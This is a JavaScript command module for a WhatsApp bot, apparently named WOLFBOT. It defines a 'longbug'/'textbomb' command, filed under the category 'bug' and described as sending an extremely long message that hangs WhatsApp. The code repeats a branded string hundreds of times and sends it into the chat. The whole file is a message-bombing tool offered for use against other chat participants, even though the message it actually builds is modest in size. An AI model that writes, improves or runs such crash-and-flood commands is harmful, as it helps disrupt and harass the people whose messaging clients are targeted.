export default {
  name: 'longbug',
  alias: ['longtext', 'longmsg', 'textbomb'],
  description: 'Send an extremely long message that hangs WhatsApp',
  category: 'bug',

  async execute(sock, m, args, PREFIX) {
    const jid = m.key.remoteJid;
    const repeat = Math.min(500, Math.max(100, parseInt(args[0]) || 200));
    const chunk  = '🐺 WOLFBOT '.repeat(repeat);

    try {
      await sock.sendMessage(jid, { react: { text: '📜', key: m.key } });
      await sock.sendMessage(jid, { text: chunk }, { quoted: m });
    } catch (err) {
      await sock.sendMessage(jid, {
        text: `❌ Failed: ${err.message}`
      }, { quoted: m });
    }
  }
};
